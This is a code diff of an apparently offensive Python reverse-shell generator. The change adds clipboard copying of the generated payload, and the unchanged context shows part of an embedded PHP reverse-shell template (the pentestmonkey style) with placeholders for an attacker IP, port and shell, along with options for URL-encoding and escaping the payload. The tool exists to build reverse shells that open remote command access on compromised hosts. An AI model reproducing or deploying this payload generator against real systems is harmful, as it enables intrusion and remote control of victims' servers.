@@ -1,5 +1,5 @@
 import subprocess, sys, base64, re
-import urllib.parse
+import urllib.parse, pyperclip
 
 monkey = """<?php set_time_limit (0);$VERSION = "1.0";$ip = '^IP^';$port = ^PORT^;$chunk_size = 1400;$write_a = null;$error_a = null;$shell = '^SHELL^';$daemon = 0;$debug = 0;
 if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Can't fork"); exit(1); } if ($pid) { exit(0);}
@@ -124,7 +124,8 @@ def main(connection, revy, webshell = '', escape = [], space2cross = '', uencode
 		revy = rencoded
 	if space2cross != '':
 		revy = revy.replace(' ', "+")
-
+	pyperclip.copy(revy.strip())
+	print("[+] Revy copied to clipboard!")
 	print(revy.strip())
 
 def help():
